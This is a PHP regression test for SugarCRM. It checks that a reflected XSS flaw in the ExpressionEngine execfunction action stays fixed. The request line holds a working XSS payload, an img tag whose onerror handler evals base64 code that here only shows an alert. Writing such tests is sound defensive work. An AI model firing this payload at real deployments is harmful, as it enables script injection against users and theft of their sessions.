<?php
/*
 * Your installation or use of this SugarCRM file is subject to the applicable
 * terms available at
 * http://support.sugarcrm.com/Resources/Master_Subscription_Agreements/.
 * If you do not agree to all of the applicable terms or do not have the
 * authority to bind the entity as an authorized representative, then do not
 * install or use this SugarCRM file.
 *
 * Copyright (C) SugarCRM Inc. All rights reserved.
 */
declare(strict_types=1);

use Regression\SugarCRMRegression;

class ExpressionExecFunctionRegression extends SugarCRMRegression
{
    /**
     * @return string
     */
    public function getRegressionDescription(): string
    {
        return '[BR-10895] (Another) Reflected XSS through the ExpressionEngine module';
    }

    /**
     * @throws \GuzzleHttp\Exception\GuzzleException
     * @throws \Regression\RegressionException
     */
    public function run(): void
    {
        $this->login('admin', 'asdf')
            ->bwcLogin()
            ->get('/index.php?module=ExpressionEngine&action=execfunction&tmodule=Bugs&id=1&params=%5B"%5Cu0022%5Cu003Cimg%5Cu0020src%3Dx%5Cu0020onerror%3Deval%28atob%28%5Cu0027YWxlcnQoJ1hTUyBvbiAnK2RvY3VtZW50LmRvbWFpbik%3D%5Cu0027%29%29%5Cu003E%5Cu0022"%5D&function=toString&bwcRedirect=1')
            ->expectSubstring("\u003Cimg src=x onerror=eval(atob(\u0027YWxlcnQoJ1hTUyBvbiAnK2RvY3VtZW50LmRvbWFpbik=\u0027))\u003E");
    }
}
